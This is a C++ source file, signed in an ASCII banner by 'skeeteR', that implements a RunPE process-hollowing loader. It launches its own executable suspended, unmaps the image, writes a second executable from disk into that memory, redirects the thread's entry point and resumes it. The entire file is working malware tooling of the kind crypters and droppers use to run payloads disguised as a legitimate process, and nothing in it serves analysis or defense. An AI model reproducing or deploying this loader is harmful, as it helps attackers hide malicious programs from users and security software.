//                         _         _                   _                _        ______ 
//                        | |       | |                 | |              | |       | ___ \
//   _ __ ___    __ _   __| |  ___  | |__   _   _   ___ | | __ ___   ___ | |_  ___ | |_/ /
//  | '_ ` _ \  / _` | / _` | / _ \ | '_ \ | | | | / __|| |/ // _ \ / _ \| __|/ _ \|    / 
//  | | | | | || (_| || (_| ||  __/ | |_) || |_| | \__ \|   <|  __/|  __/| |_|  __/| |\ \ 
//  |_| |_| |_| \__,_| \__,_| \___| |_.__/  \__, | |___/|_|\_\\___| \___| \__|\___|\_| \_|
//                                           __/ |                                        
//                                          |___/                                          


#include <Windows.h>

typedef LONG (WINAPI * NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

LPVOID FileToMem(LPCSTR szFileName)
{
HANDLE hFile;
DWORD dwRead;
DWORD dwSize;
LPVOID pBuffer = NULL;

hFile = CreateFileA(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
if (hFile)
{
dwSize = GetFileSize(hFile, NULL);
if (dwSize > 0)
{
pBuffer = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
if (pBuffer)
{
SetFilePointer(hFile, NULL, NULL, FILE_BEGIN);
ReadFile(hFile, pBuffer, dwSize, &dwRead, NULL);
}
}
CloseHandle(hFile);
}
return pBuffer;
}

void ExecFile(LPSTR szFilePath, LPVOID pFile)
{
PIMAGE_DOS_HEADER IDH;
PIMAGE_NT_HEADERS INH;
PIMAGE_SECTION_HEADER ISH;
PROCESS_INFORMATION PI;
STARTUPINFOA SI;
PCONTEXT CTX;
PDWORD dwImageBase;
NtUnmapViewOfSection xNtUnmapViewOfSection;
LPVOID pImageBase;
int Count;

IDH = PIMAGE_DOS_HEADER(pFile);
if (IDH->e_magic == IMAGE_DOS_SIGNATURE)
{
INH = PIMAGE_NT_HEADERS(DWORD(pFile) + IDH->e_lfanew);
if (INH->Signature == IMAGE_NT_SIGNATURE)
{
RtlZeroMemory(&SI, sizeof(SI));
RtlZeroMemory(&PI, sizeof(PI));

if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
{
CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
CTX->ContextFlags = CONTEXT_FULL;
if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
{
ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&dwImageBase), 4, NULL);

if (DWORD(dwImageBase) == INH->OptionalHeader.ImageBase)
{
xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
xNtUnmapViewOfSection(PI.hProcess, PVOID(dwImageBase));
}

pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
if (pImageBase)
{
WriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);
for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++)
{
ISH = PIMAGE_SECTION_HEADER(DWORD(pFile) + IDH->e_lfanew + 248 + (Count * 40));
WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + ISH->VirtualAddress), LPVOID(DWORD(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
}
WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&INH->OptionalHeader.ImageBase), 4, NULL);
CTX->Eax = DWORD(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
SetThreadContext(PI.hThread, LPCONTEXT(CTX));
ResumeThread(PI.hThread);
}
}
}
}
}
VirtualFree(pFile, 0, MEM_RELEASE);
}

int main()
{
LPVOID pFile;
TCHAR szFilePath[1024];

pFile = FileToMem("C:\\2.exe");// give the adress to the file you want to //execute
if (pFile)
{
GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
ExecFile(LPSTR(szFilePath), pFile);
}
return 0;
}
